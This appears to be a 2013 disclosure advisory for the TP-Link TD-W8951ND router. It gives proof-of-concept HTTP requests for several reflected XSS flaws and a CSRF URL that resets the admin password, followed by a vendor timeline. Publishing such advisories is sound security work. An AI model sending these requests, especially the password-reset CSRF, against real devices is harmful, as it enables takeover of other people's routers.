@@ -1,0 +1,69 @@
+-----------
+Author:
+-----------
+
+xistence < xistence[at]0x90[.]nl >
+
+-------------------------
+Affected products:
+-------------------------
+
+Tested on TP-Link TD-W8951ND Firmware 4.0.0 Build 120607 Rel.30923
+
+-------------------------
+Affected vendors:
+-------------------------
+
+TP-Link
+http://www.tp-link.com/
+
+----------
+Details:
+----------
+
+[ 0x01 - Unauthenticated Reflected XSS in Referer for non-existing url
+pages ]
+
+GET /doesnotexist HTTP/1.1
+Host: <IP>
+Referer: http://pwned"><script>alert("XSS")</script>
+Connection: keep-alive
+
+
+[ 0x02 - Authenticated Reflected XSS in "home_wlan_1" arguments ]
+
+http://
+<IP>/Forms/home_wlan_1?wlanWEBFlag=%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E
+http://
+<IP>/Forms/home_wlan_1?AccessFlag=%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E
+http://
+<IP>/Forms/home_wlan_1?wlan_APenable=%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E
+
+
+[ 0x03 - Authenticated XSS in diagnostics (ping) "/Forms/tools_test_1"
+argument "PingIPAddr" ]
+
+POST /Forms/tools_test_1 HTTP/1.1
+Host: <IP>
+Referer: http://<IP>/maintenance/tools_test.htm
+Authorization: Basic blablabla==
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 164
+
+Test_PVC=PVC0&PingIPAddr=%3C%2Ftextarea%3E%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E&pingflag=1&trace_open_flag=0&InfoDisplay=Ping+request+could+not+find+host+
+
+
+[ 0x04 - Reset Admin password CSRF ]
+
+http://
+<IP>/Forms/tools_admin_1?uiViewTools_Password=PWNED&uiViewTools_PasswordConfirm=PWNED
+
+--------------
+Timeline:
+--------------
+
+2013-05-30 Provided details to TP-Link.
+2013-06-01 Response from TP-Link that they will try to fix it.
+2013-07-31 No further response, mailed again to ask for status.
+2013-08-30 No response, public disclosure.
